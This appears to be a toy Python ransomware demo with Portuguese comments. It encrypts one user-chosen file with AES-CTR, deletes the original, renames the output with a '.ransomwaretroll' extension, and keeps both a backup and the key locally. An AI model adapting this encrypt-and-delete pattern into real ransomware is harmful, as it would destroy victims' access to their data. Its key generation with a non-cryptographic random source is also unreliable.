import os
import pyaes
import random
import string

# Função para gerar uma chave aleatória de 16 bytes
def generate_key():
    return bytes(''.join(random.choices(string.ascii_letters + string.digits, k=16)), 'utf-8')

# Solicitar o nome do arquivo
file_name = input('Digite o nome do arquivo: ')

try:
    # Abrir o arquivo a ser criptografado
    with open(file_name, 'rb') as file:
        file_data = file.read()

    # Fazer backup do arquivo original
    backup_name = file_name + '.backup'
    with open(backup_name, 'wb') as backup:
        backup.write(file_data)

    # Remover o arquivo original
    os.remove(file_name)

    # Gerar uma chave aleatória para encriptação
    key = generate_key()
    aes = pyaes.AESModeOfOperationCTR(key)

    # Criptografar os dados do arquivo
    crypto_data = aes.encrypt(file_data)

    # Nome do novo arquivo criptografado
    new_file_name = file_name + '.ransomwaretroll'

    # Salvar os dados criptografados no novo arquivo
    with open(new_file_name, 'wb') as new_file:
        new_file.write(crypto_data)

    print(f'Arquivo criptografado com sucesso: {new_file_name}')

    # Salvar a chave no formato binário correto em key.txt
    with open('key.txt', 'wb') as chave:
        chave.write(key)

except Exception as e:
    print(f'Ocorreu um erro: {e}')
